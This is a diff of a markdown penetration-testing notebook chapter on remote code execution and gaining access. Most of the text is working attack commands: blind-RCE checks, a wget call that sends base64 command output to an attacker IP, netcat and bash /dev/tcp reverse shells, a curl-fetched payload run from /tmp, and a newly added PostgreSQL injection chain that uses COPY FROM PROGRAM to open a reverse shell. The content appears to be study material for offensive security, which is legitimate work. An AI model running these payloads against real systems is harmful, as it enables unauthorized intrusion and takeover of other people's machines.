@@ -1,4 +1,4 @@
-# (PART) Vuln exploit & Gaining Access{-}
+# (PART) Vuln exploit & Gaining Access {-}
 
 # Beyond Remote Code Execution {-}
 
@@ -9,18 +9,18 @@ You always have to be aware of command type execution language. Sometimes bash c
 languages. If the website is in php try to call phpinfo(); for example. Then you will know that your remote code execution will
 look like system('whoami');
 
-## Checking if code execution occurs {-}
+# Checking if code execution occurs {-}
 
 Sometimes attacker don't realy know if remote code execution occurs because no direct output are visible
 to him. Here we will see some technics to know if code execution runs or not.
 
-### Time sleep technic {-}
+## Time sleep technic {-}
 
 ```bash
 GET /script.php?cmd=sleep+5&ok=ok HTTP/1.1
 ```
 
-### Check network connectivity {-}
+## Check network connectivity {-}
 
 Lets try to ping the attacker machine, attacker can use wireshark or tcpdump.
 
@@ -35,13 +35,15 @@ remote code execution ping
 ping -c 5 <attacker ip>
 ```
 
-### Use wget and netcat to execute command {-}
+## Use wget and netcat to execute command {-}
 
 1. listener (attacker)
 
     ```bash
     nc -nlvp 443
     ```
+    > [!] NOTE: use `rlwrap nc -nlvp 443` for windows machines
+    
 2. powned (victim)
 
     ```bash
@@ -52,7 +54,7 @@ ping -c 5 <attacker ip>
 > ```wget http://<pirate_ip>:443/`id|base64` ```
 
 
-## Visible remote code execution {-}
+# Visible remote code execution {-}
 
 **Visible remote code execution** can be performed with code looking like that:
 
@@ -88,9 +90,9 @@ which nc
 which wget
 ```
 
-## Gaining access throw remote code execution {-}
+# Gaining access throw remote code execution {-}
 
-### Listen and connection with netcat {-}
+## Listen and connection with netcat {-}
 
 **Netcat** also known as **nc** is a utility that allows to open TCP or UDP connections throw the network.
 
@@ -108,7 +110,7 @@ How it work:
     nc -e /bin/bash <pirate_ip> 443
     ```
 
-### Connection with curl {-}
+## Connection with curl {-}
 
 1. attacker http server (attacker)  
 
@@ -136,9 +138,7 @@ How it work:
     /tmp/r
     ```
 
-
-
-# Spawning a terminal from a shell {-}
+## Spawning a terminal from a shell {-}
 
 After a successfull connection it's important to prepare the shell to be able to work confortably.
 The following command are always the same:
@@ -160,10 +160,26 @@ stty rows <rownb> columns <colnb>
 > [ ! ] Note: stty -a is done in the attacker shell to know rows and columns size
 
 
+# Use SQL Injection for create a reverse shell {-}
 
+## Postgresql {-}
 
+1. Check the db VERSION
 
+    ```
+    ' UNION SELECT NULL, NULL, NULL, NUUL, VERSION() --
+    ```
 
+1. Create a table for execute commands
 
+    ```
+    '; CREATE TABLE cmd_exec(cmd_output text) --
+    ```
+
+1. Initiate a reverse shell
+
+    ```
+    '; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.10.10/443 0>&1'''; --
+    ```
 
 
